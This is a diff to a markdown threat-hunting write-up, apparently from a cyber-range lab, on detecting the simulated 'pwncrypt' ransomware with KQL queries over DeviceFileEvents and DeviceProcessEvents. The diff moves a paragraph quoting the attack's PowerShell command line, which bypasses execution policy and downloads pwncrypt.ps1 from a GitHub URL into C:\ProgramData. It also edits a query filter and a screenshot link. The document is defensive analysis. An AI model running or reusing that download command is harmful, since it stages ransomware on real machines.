@@ -46,11 +46,7 @@ DeviceFileEvents
 
 I ran a query that revealed several files created with the “pwncrypt” extension.
 - Files: `1308_EmployeeRecords_pwncrypt.csv`, `6664_ProjectList_pwncrypt.csv`, `2669_CompanyFinancials_pwncrypt.csv`.
-- Additionally, the `InitiatingProcessCommandLine` table revealed the script that was run:
-  - `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1`
-    - The command opens PowerShell, tells it to ignore all safety settings(`ExecutionPolicy Bypass `),
-    - then downloads a suspicious script called pwncrypt.ps1 from the internet(`Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1`)
-    - and saves it in a system folder(`C:\ProgramData\pwncrypt.ps1`)
+
 
 **Query used to locate events:**
 ```kql
@@ -76,7 +72,11 @@ DeviceFileEvents
 ### 3. Searched the `DeviceProcessEvents` Table
 
 I next checked the DeviceProcessEvents table in order to determine how the files were encrypted. I found evidence of manual `cmd.exe` of powershell running 
-
+- Additionally, the `InitiatingProcessCommandLine` table revealed the script that was run:
+  - `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1`
+    - The command opens PowerShell, tells it to ignore all safety settings(`ExecutionPolicy Bypass `),
+    - then downloads a suspicious script called pwncrypt.ps1 from the internet(`Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1`)
+    - and saves it in a system folder(`C:\ProgramData\pwncrypt.ps1`)
 **Query used to locate event:**
 
 ```kql
@@ -86,10 +86,10 @@ DeviceProcessEvents
 | where FileName endswith "powershell.exe"
 | where ProcessCommandLine contains "pwncrypt.ps1"
 | project Timestamp, ProcessCommandLine, InitiatingProcessCommandLine, InitiatingProcessAccountName
-| where Timestamp >= datetime(2025-04-17T20:14:28.4324263Z)
 | sort by Timestamp desc
 ```
-![image](https://github.com/user-attachments/assets/3a851f9b-6e23-47fc-b9e9-bb078d67ce15)
+![image](https://github.com/user-attachments/assets/e50340a2-bed0-42bf-95b4-581d12ea59a4)
+
 
 
 ---
